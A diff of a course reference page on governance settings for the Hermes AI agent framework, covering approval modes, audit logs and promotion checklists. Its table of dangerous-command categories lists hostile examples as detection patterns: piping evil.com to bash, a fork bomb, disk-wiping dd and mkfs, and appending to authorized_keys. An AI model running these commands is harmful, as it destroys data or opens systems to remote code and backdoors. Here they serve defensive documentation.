@@ -3,7 +3,7 @@ id: module-13-reference
 title: "Reference: Governance Config Templates and Audit Logs"
 sidebar_label: "Reference"
 sidebar_position: 2
-description: "Governance configuration per maturity level, approval workflow setup, audit log format, and promotion checklist"
+description: "Hermes governance config per maturity level, DANGEROUS_PATTERNS categories, approval modes, audit log format, and promotion checklist"
 ---
 
 # Reference: Governance Config Templates and Audit Logs
@@ -17,152 +17,274 @@ Quick-reference for Module 13 — configuring governance layers in Hermes.
 ### L1: Assistive
 
 ```yaml
-governance:
-  level: L1
-  description: "Assistive — observe and report only"
+# governance-L1.yaml — No terminal, no commands, no approval gate fires
+model:
+  default: "anthropic/claude-haiku-4"
+  provider: "auto"
 
-  do:  # Autonomous actions
-    - read_metrics
-    - read_logs
-    - read_configuration
-    - add_diagnostic_comment  # Low-blast-radius write
+platform_toolsets:
+  cli: [web, skills]    # terminal absent — agent cannot execute commands
 
-  approve:  # Everything else requires approval
-    default_approver: "on-call"
-    timeout_minutes: 10
-    timeout_action: abort
+approvals:
+  mode: manual          # mode is set even at L1; defense against misconfiguration
+  timeout: 300
 
-  log:
-    enabled: true
-    log_level: standard  # All actions, no verbose detail
-    retention_days: 90
+command_allowlist: []
+
+agent:
+  max_turns: 30
 ```
+
+The agent reads web resources and loaded skills, proposes actions as text. The human reviews every proposed step and executes it manually. This is the correct starting point for any new agent in a new environment.
 
 ### L2: Advisory
 
 ```yaml
-governance:
-  level: L2
-  description: "Advisory — safe writes autonomous, state changes require approval"
+# governance-L2.yaml — Terminal enabled, manual approval for all DANGEROUS_PATTERNS matches
+model:
+  default: "anthropic/claude-haiku-4"
+  provider: "auto"
 
-  do:
-    - read_metrics
-    - read_logs
-    - read_configuration
-    - add_diagnostic_comment
-    - update_monitoring_annotation
-    - post_slack_notification
-    - update_documentation
+platform_toolsets:
+  cli: [terminal, file, web, skills]    # terminal enabled
 
-  approve:
-    actions:
-      - action: restart_pod
-        approver: "service-owner"
-        timeout_minutes: 5
-        escalation_approver: "on-call"
-        escalation_timeout_minutes: 10
-      - action: modify_parameter
-        approver: "platform-lead"
-        timeout_minutes: 15
-        escalation_approver: "platform-director"
-    default_approver: "on-call"
-    timeout_action: abort
+approvals:
+  mode: manual           # every DANGEROUS_PATTERNS match pauses for human decision
+  timeout: 300
 
-  log:
-    enabled: true
-    log_level: standard
-    retention_days: 90
+command_allowlist: []    # nothing pre-approved
+
+agent:
+  max_turns: 30
+```
+
+**Diff from L1:** `platform_toolsets.cli` gains `terminal` and `file`. The approval mode is the same (`manual`), but it now has commands to potentially flag.
+
+```bash
+diff course/governance/governance-L1.yaml course/governance/governance-L2.yaml
+# < cli: [web, skills]
+# > cli: [terminal, file, web, skills]
 ```
 
 ### L3: Proposal
 
 ```yaml
-governance:
-  level: L3
-  description: "Proposal — reversible operations autonomous within defined scope"
+# governance-L3.yaml — Smart approval replaces manual
+model:
+  default: "anthropic/claude-haiku-4"
+  provider: "auto"
 
-  do:
-    - read_metrics
-    - read_logs
-    - read_configuration
-    - add_diagnostic_comment
-    - update_monitoring_annotation
-    - post_slack_notification
-    - restart_pod  # Now autonomous at L3
-    - rollback_deployment  # Autonomous within policy
-    - scale_service:
-        max_replicas: 10
-        min_replicas: 1
-        cooldown_minutes: 10
-    - create_alert
+platform_toolsets:
+  cli: [terminal, file, web, skills]
 
-  approve:
-    actions:
-      - action: modify_rds_parameter
-        approver: "dba-team"
-        timeout_minutes: 10
-        escalation_approver: "on-call"
-        proposal_format: structured  # See proposal format below
-      - action: ec2_instance_type_change
-        approver: "platform-lead"
-        timeout_minutes: 30
-        proposal_format: structured
-    default_approver: "on-call"
-    timeout_action: abort
+approvals:
+  mode: smart            # auxiliary LLM auto-approves low-risk, escalates high-risk
+  timeout: 300
 
-  log:
-    enabled: true
-    log_level: verbose  # Higher detail at L3 to support audit
-    retention_days: 365
-    include_tool_outputs: true
+command_allowlist: []
+
+agent:
+  max_turns: 30
 ```
 
-### L4: Semi-Autonomous
+**Diff from L2:** Only `approvals.mode` changes. The toolsets and allowlist are identical.
+
+```bash
+diff course/governance/governance-L2.yaml course/governance/governance-L3.yaml
+# < mode: manual
+# > mode: smart
+```
+
+### L4: Semi-Autonomous (Track A — DBA)
 
 ```yaml
-governance:
-  level: L4
-  description: "Semi-autonomous — wide autonomous scope, irreversible operations require approval"
+# governance-L4-track-a.yaml — Smart approval + documented allowlist discussion
+model:
+  default: "anthropic/claude-haiku-4"
+  provider: "auto"
 
-  do:
-    - "*"  # All actions except those in approve list
-    - parameter_tuning:
-        max_change_percent: 20  # Parameter within 20% of current value
-        allowed_parameters:
-          - max_connections
-          - shared_buffers
-          - work_mem
+platform_toolsets:
+  cli: [terminal, file, web, skills]
 
-  approve:
-    actions:
-      - action: delete_resource
-        approver: "platform-director"
-        timeout_minutes: 60
-        requires_rollback_plan: true
-      - action: terminate_instance
-        approver: "platform-director"
-        timeout_minutes: 60
-      - action: security_group_change
-        approver: "security-team"
-        timeout_minutes: 120
-      - action: cost_action_over_threshold:
-          threshold_usd: 500
-        approver: "finance-lead"
-    default_for_unlisted: do  # Trust unless specifically in approve list
+approvals:
+  mode: smart
+  timeout: 300
 
-  log:
-    enabled: true
-    log_level: verbose
-    retention_days: 2555  # 7 years for compliance
-    include_tool_outputs: true
-    include_approval_chain: true
+# command_allowlist at L4 Track A:
+# At the course level, this remains empty. In production, it would contain
+# description-key strings from DANGEROUS_PATTERNS for commands that Track A
+# legitimately needs to run and has demonstrated as safe over its L2-L3 track record.
+# Example (not added until formal review):
+# - "SQL SELECT"   # Read-only queries — never flagged but not yet pre-approved at course level
+command_allowlist: []
+
+agent:
+  max_turns: 30
+```
+
+### L4: Semi-Autonomous (Track B — FinOps)
+
+```yaml
+# governance-L4-track-b.yaml
+# IMPORTANT NOTE: aws ec2 terminate-instances and modify-instance-attribute
+# are NOT in Hermes DANGEROUS_PATTERNS. Safety for these commands is enforced
+# via SOUL.md NEVER rules (behavioral governance), not the approval gate (mechanical).
+# This means the command_allowlist cannot help for Track B's most dangerous commands.
+# SOUL.md NEVER rules are load-bearing for Track B — removing them would leave
+# NO mechanical backstop for terminate-instances.
+
+platform_toolsets:
+  cli: [terminal, file, web, skills]
+
+approvals:
+  mode: smart
+  timeout: 300
+
+command_allowlist: []
+```
+
+### L4: Semi-Autonomous (Track C — Kubernetes)
+
+```yaml
+# governance-L4-track-c.yaml
+# IMPORTANT NOTE: kubectl delete, kubectl drain, and kubectl cordon
+# are NOT in Hermes DANGEROUS_PATTERNS. Same pattern as Track B.
+# SOUL.md NEVER rules are the primary governance mechanism for K8s destructive commands.
+# Removing NEVER rules from Kiran's SOUL.md would leave no protection against kubectl drain.
+
+platform_toolsets:
+  cli: [terminal, file, web, skills]
+
+approvals:
+  mode: smart
+  timeout: 300
+
+command_allowlist: []
 ```
 
 ---
 
-## 2. Structured Approval Proposal Format
+## 2. Diff Commands to See What Changes Between Levels
 
-When `proposal_format: structured` is configured, the agent generates this proposal before sending to approver:
+```bash
+# See what L2 adds to L1 (adding terminal access)
+diff course/governance/governance-L1.yaml course/governance/governance-L2.yaml
+
+# See what L3 changes from L2 (approval mode only)
+diff course/governance/governance-L2.yaml course/governance/governance-L3.yaml
+
+# See what L4 Track A documents vs L3 (mostly comments, empty allowlist)
+diff course/governance/governance-L3.yaml course/governance/governance-L4-track-a.yaml
+```
+
+The progression is additive: each level adds or changes one key from the previous level.
+
+---
+
+## 3. Approval Mode Detail
+
+### manual (L2 default)
+
+When DANGEROUS_PATTERNS matches a command with `approvals.mode: manual`:
+
+```
+⚠️  DANGEROUS COMMAND: SQL DROP
+    DROP TABLE users
+    [o]nce  |  [s]ession  |  [a]lways  |  [d]eny
+```
+
+**Choice semantics:**
+- `once`: approve this specific execution. Next time the same pattern is detected, ask again.
+- `session`: approve this pattern for the rest of this conversation session
+- `always`: approve this pattern permanently (written to `command_allowlist` in config.yaml)
+- `deny`: block execution. The agent is told "BLOCKED: User denied. Do NOT retry."
+
+**Timeout:** If no response within `approvals.timeout` seconds (default 300), the command is treated as denied.
+
+In gateway mode (Slack, Telegram, Discord), the approval prompt is delivered as a message and the agent thread blocks until the human responds with `/approve` or `/deny`.
+
+### smart (L3 default)
+
+The same pattern detection runs, but before presenting to the human, an auxiliary LLM reviews the command:
+
+```python
+# From tools/approval.py
+prompt = """You are a security reviewer for an AI coding agent.
+Command: {command}
+Flagged reason: {description}
+
+APPROVE if the command is clearly safe
+DENY if genuinely dangerous
+ESCALATE if uncertain
+
+Respond with exactly one word: APPROVE, DENY, or ESCALATE"""
+```
+
+- `APPROVE`: command is a false positive (e.g., `python -c "print('hello')"` triggering the `-c flag` pattern). Auto-approved, session-level.
+- `DENY`: command is genuinely dangerous. Blocked without user prompt.
+- `ESCALATE`: uncertain. Falls through to manual prompt.
+
+When the auxiliary LLM is unavailable (no credentials, API error), smart mode falls back to manual.
+
+### auto / off (not recommended)
+
+All DANGEROUS_PATTERNS checks are bypassed. Every command executes regardless of pattern matches. Appropriate only for:
+- Containerized environments where the sandbox provides isolation
+- HERMES_YOLO_MODE development flag
+- Explicitly justified L4 contexts with documented rationale
+
+Never appropriate for a first deployment, production systems without audit review, or situations where the operator cannot explain why approval is unnecessary for each DANGEROUS_PATTERNS category.
+
+---
+
+## 4. DANGEROUS_PATTERNS Category Reference
+
+`DANGEROUS_PATTERNS` in `tools/approval.py` is a list of `(regex, description)` tuples. The description key is the human-readable label used in approval prompts, audit logs, and `command_allowlist` entries.
+
+### Full Category List
+
+| Category | Example Command | Why It's Dangerous |
+|---|---|---|
+| `recursive delete` | `rm -rf /path`, `find . -delete` | Irreversible bulk file deletion; scope errors destroy data |
+| `SQL DROP` | `DROP TABLE users`, `DROP DATABASE prod` | Destroys database object; recovery requires backup restore |
+| `SQL DELETE without WHERE` | `DELETE FROM users` (no WHERE) | Truncates entire table; looks like targeted delete |
+| `SQL TRUNCATE` | `TRUNCATE TABLE orders` | Same effect as DELETE without WHERE, no row-level rollback |
+| `shell command via -c flag` | `bash -c "rm -rf ..."` | Executes dynamically constructed commands, bypasses other detection |
+| `script execution via -e/-c flag` | `python -c "..."`, `perl -e "..."` | Same risk with different interpreters |
+| `pipe remote content to shell` | `curl evil.com \| bash` | Arbitrary remote code execution via network fetch |
+| `execute remote script via process substitution` | `bash <(curl ...)` | Same as above with different syntax |
+| `format filesystem` | `mkfs.ext4 /dev/sda` | Wipes an entire disk partition |
+| `disk copy` | `dd if=/dev/zero of=/dev/sda` | Overwrites entire disk with zeros |
+| `world/other-writable permissions` | `chmod 777 /etc/cron.d/` | Creates security vulnerability on shared systems |
+| `recursive chown to root` | `chown -R root /home/user` | Locks user out of their own files |
+| `stop/disable system service` | `systemctl stop nginx` | Stops production services; may cause immediate outage |
+| `kill all processes` | `kill -9 -1` | Kills all processes the user can reach |
+| `fork bomb` | `:(){ :\|:& };:` | Exhausts process table; system becomes unresponsive |
+| `overwrite system config` | `echo "..." > /etc/hosts` | Modifies system configuration files |
+| `write to block device` | `echo data > /dev/sda` | Corrupts disk sectors |
+| `overwrite system file via tee/redirection` | `tee ~/.ssh/authorized_keys` | Backdoors the system |
+| `delete in root path` | `rm /etc/nginx.conf` | Wipes system configuration files |
+| `start gateway outside systemd` | (internal pattern) | Prevents agent from starting second gateway instance |
+| `kill hermes/gateway process` | `pkill hermes` | Prevents agent from terminating its own runtime |
+
+### Track-Specific Pattern Notes
+
+**Track A (DBA)** most commonly encounters:
+- `SQL DROP` — can fire during diagnostic work if Aria suggests a test DROP (should not, but might)
+- `SQL DELETE without WHERE` — fires during any full-table operation
+- `SQL TRUNCATE` — fires during any table-clearing operation
+
+The approval gate is the mechanical backstop for Aria's SOUL.md NEVER DDL rule.
+
+**Track B (FinOps) and Track C (Kubernetes)** rarely encounter DANGEROUS_PATTERNS in normal operation. Their destructive commands (`aws ec2 terminate-instances`, `kubectl delete`) are intentionally NOT in the list. SOUL.md NEVER rules are the sole governance mechanism.
+
+**Fleet coordinator** has no terminal toolset, so DANGEROUS_PATTERNS never fires for Morgan. Morgan's governance is purely behavioral.
+
+---
+
+## 5. Structured Approval Proposal Format
+
+When an agent generates a proposal (L3+ with `approvals.mode: smart` or in a gateway integration), the structured format includes:
 
 ```markdown
 ## Action Proposal — Hermes DB Health Agent
@@ -177,46 +299,48 @@ When `proposal_format: structured` is configured, the agent generates this propo
 - p99 latency: 450ms (vs. 120ms baseline — 275% elevated)
 
 **Root Cause Assessment (High confidence):**
-Connection pool exhaustion is causing query queuing. Increasing max_connections by 50 provides immediate relief while root cause (elevated active connections) is investigated.
+Connection pool exhaustion is causing query queuing. Increasing max_connections by 50 provides
+immediate relief while root cause (elevated active connections) is investigated.
 
 **Expected Outcome:**
 - Connection wait queue should clear within 60 seconds of parameter application
 - p99 latency should return to near-baseline within 5 minutes
-- CPU expected to increase slightly (5-10%) due to additional connections
 
 **Rollback Plan:**
 Reduce max_connections back to 100 via:
-`aws rds modify-db-parameter-group --db-parameter-group-name prod-pg15 --parameters ParameterName=max_connections,ParameterValue=100,ApplyMethod=immediate`
-Note: decreasing max_connections requires active connections to fall first.
+`aws rds modify-db-parameter-group --db-parameter-group-name prod-pg15 \
+  --parameters ParameterName=max_connections,ParameterValue=100,ApplyMethod=immediate`
 
 **Risk Assessment:** Low — increasing connection limit is reversible; does not risk data loss.
 
 **Time Sensitivity:** High — current connection exhaustion is causing customer-facing latency.
 
-**To approve:** Reply APPROVE | To reject: Reply REJECT [reason] | For info: Reply INFO
+**To approve:** Reply APPROVE | To reject: Reply REJECT [reason]
 Expires in 10 minutes. If no response, action will be ABORTED.
 ```
 
 ---
 
-## 3. Audit Log Format
+## 6. Audit Log Format
 
-Every agent action produces an audit log entry:
+Every approval event creates a log entry. In CLI mode, approval interactions are written to the standard Hermes session log. In gateway mode, they are recorded in the session's SQLite state database.
+
+For cron-scheduled jobs, the scheduler saves all agent output to `~/.hermes/cron/output/{job_id}/{timestamp}.md`. When an agent has nothing new to report, it begins its response with `[SILENT]` — this suppresses delivery to the messaging platform, but the output is still saved locally for audit. The audit trail is never suppressed, even when delivery is.
+
+### Audit Entry Schema
 
 ```json
 {
   "audit_id": "AUD-2026-04-01-0001",
   "timestamp": "2026-04-01T14:23:11Z",
   "agent": {
-    "profile": "rds-health-agent",
-    "version": "1.3.2",
-    "governance_level": "L3",
-    "skill": "rds-health-v1.2"
+    "profile": "track-a",
+    "governance_level": "L2",
+    "skill": "dba-rds-slow-query-1.0.0"
   },
   "trigger": {
-    "type": "webhook",
-    "source": "cloudwatch-alarm",
-    "alarm_name": "RDS-ConnectionCount-db-prod-01"
+    "type": "cli",
+    "task": "Investigate high CPU on prod-db-01"
   },
   "actions": [
     {
@@ -224,86 +348,112 @@ Every agent action produces an audit log entry:
       "action_type": "read_metrics",
       "tool": "terminal",
       "command": "aws cloudwatch get-metric-statistics [params]",
+      "dangerous_pattern_matched": null,
       "governance_category": "DO",
-      "status": "success",
-      "elapsed_ms": 1240
+      "status": "success"
     },
     {
       "sequence": 5,
-      "action_type": "modify_rds_parameter",
-      "governance_category": "APPROVE",
-      "proposal_sent_at": "2026-04-01T14:24:01Z",
-      "approver": "dba-team",
-      "approved_by": "jane.smith@example.com",
-      "approved_at": "2026-04-01T14:26:33Z",
+      "action_type": "query_pg_stat_statements",
       "tool": "terminal",
-      "command": "aws rds modify-db-parameter-group [params]",
-      "status": "success",
-      "elapsed_ms": 890
+      "command": "psql -h $DB_HOST ... -c 'SELECT ... FROM pg_stat_statements'",
+      "dangerous_pattern_matched": null,
+      "governance_category": "DO",
+      "status": "success"
     }
   ],
   "outcome": {
-    "diagnosis": "Connection pool exhaustion — max_connections at capacity",
+    "diagnosis": "SLOW_QUERY_INDEX_GAP",
     "confidence": "high",
-    "action_taken": "Increased max_connections 100→150 (approved)",
-    "escalation": "none"
+    "escalation": "none",
+    "recommendation": "CREATE INDEX CONCURRENTLY on orders(user_id, created_at)"
   }
 }
 ```
 
-**Audit log retention:** Configure per your compliance requirements. Minimum recommended:
+**Audit log retention:**
 - L1/L2: 90 days
 - L3: 365 days
 - L4: 7 years (2,555 days) for enterprise compliance
 
 ---
 
-## 4. Promotion Criteria Checklist
+## 7. Promotion Criteria Framework
 
-Use this checklist before promoting an agent to the next level:
+| Evidence Type | Metric | Suggested Threshold | Notes |
+|---|---|---|---|
+| Session count | Total diagnostic sessions completed | ≥ 50 (L1→L2); ≥ 100 (L2→L3) | More sessions = more evidence |
+| DANGEROUS_PATTERNS violations | Attempted dangerous commands without legitimate need | 0 | Any violation resets the clock |
+| False positive rate | Approval events triggered by safe commands | < 5% of sessions | High false-positive rate suggests SOUL.md needs tightening |
+| Escalation correctness | Escalations that were genuinely needed | ≥ 90% correct | Low rate suggests agent over-escalates |
+| Unexpected behavior events | Surprises outside expected operating pattern | 0 | Any surprise requires review before promotion |
+| Evidence period | Duration of observation | ≥ 2 weeks (L2→L3); ≥ 4 weeks (L3→L4) | Longer periods reduce sample bias |
+
+---
+
+## 8. Promotion Checklists
 
 ### L1 → L2 Promotion
 
 ```
-[ ] Agent has operated at L1 for minimum 30 days
+[ ] Agent has operated at L1 for minimum 30 days (2 weeks minimum evidence period)
+[ ] Session count ≥ 50
 [ ] Diagnosis accuracy rate ≥90% (verified against human outcome records)
-[ ] Zero false P1 escalations in the 30-day window
+[ ] Zero false P1 escalations in the observation window
 [ ] All audit logs reviewed — no unexpected actions or access patterns
-[ ] Proposed L2 autonomous actions reviewed and approved by team lead
-[ ] L2 governance config reviewed by security team
+[ ] SOUL.md NEVER rules reviewed for completeness for the domain
+[ ] Proposed L2 toolset (terminal + file) reviewed and approved by team lead
 ```
 
 ### L2 → L3 Promotion
 
 ```
-[ ] Agent has operated at L2 for minimum 60 days
-[ ] Proposals approved without modification ≥80% (from audit log)
-[ ] Zero incidents caused by agent autonomous actions in 60-day window
-[ ] L3 autonomous actions individually reviewed: blast radius assessed, rollback plan documented for each
-[ ] Formal governance review meeting held, decision recorded
-[ ] L3 governance config reviewed by security and platform leads
+[ ] Agent has operated at L2 for minimum 4 weeks
+[ ] Session count ≥ 100
+[ ] 0 DANGEROUS_PATTERNS violations attempted (all DBA operations were SELECT, EXPLAIN, SHOW)
+[ ] False-positive approval rate < 5% of sessions
+[ ] Escalation policy triggers correctly identified and escalated ≥ 90%
+[ ] Zero unexpected approval requests from the human operator
+[ ] For Track B/C: SOUL.md NEVER rules confirmed load-bearing and validated correct
+[ ] Formal review and config change: approvals.mode manual → smart
 ```
 
 ### L3 → L4 Promotion
 
 ```
-[ ] Agent has operated at L3 for minimum 90 days
-[ ] Autonomous L3 actions successful ≥95% (from audit log)
+[ ] Agent has operated at L3 for minimum 4 weeks
+[ ] Autonomous L3 actions successful ≥ 95% (from audit log)
+[ ] Zero incidents caused by agent autonomous actions
 [ ] L4 autonomous action scope formally documented
-[ ] Each L4 action has: rollback plan, blast radius assessment, responsible human owner
+[ ] Each proposed command_allowlist entry: pattern justified, blast radius assessed
+[ ] No silent pre-approvals — every allowlist entry has documented rationale
 [ ] Formal governance board review with written sign-off
+[ ] Security team signed off on credential scope for L4
 [ ] Incident response plan for "agent causes an incident at L4" documented
-[ ] Security team signed off on L4 credential scope
 ```
 
 ---
 
-## 5. Demotion Triggers
+## 9. Demotion Triggers
 
-| Trigger | Automatic Demotion |
-|---------|-------------------|
+| Trigger | Automatic Action |
+|---|---|
 | Incident caused by autonomous agent action | Immediate demotion one level |
 | Accuracy rate < 80% over 30-day rolling window | Demotion to L2 + review |
 | False P1 escalation | Demotion review (may remain at current level with documented fix) |
 | Unapproved action detected in audit log | Immediate L1 until investigation complete |
 | Security finding in agent credential scope | Immediate L1 until remediated |
+
+---
+
+## 10. Is Your Governance Config Production-Ready? Checklist
+
+- [ ] SOUL.md NEVER rules cover the most dangerous actions for this domain (not just generic AI safety rules)
+- [ ] `approvals.mode` is set to `manual` for first deployment; `smart` only after documented L2 track record
+- [ ] `command_allowlist` entries are documented with rationale — no silent pre-approvals
+- [ ] `approvals.timeout` is appropriate to deployment context (300s for interactive; lower for automated pipelines)
+- [ ] Audit log location is known and accessible to operators responsible for the promotion decision
+- [ ] For Track B agents: SOUL.md NEVER rules for `aws ec2 terminate-instances` are treated as load-bearing safety controls
+- [ ] For Track C agents: SOUL.md NEVER rules for `kubectl delete` and `kubectl drain` are treated as load-bearing safety controls
+- [ ] Promotion criteria are documented and understood by all operators
+- [ ] Demotion triggers are documented and enforced (not just advisory)
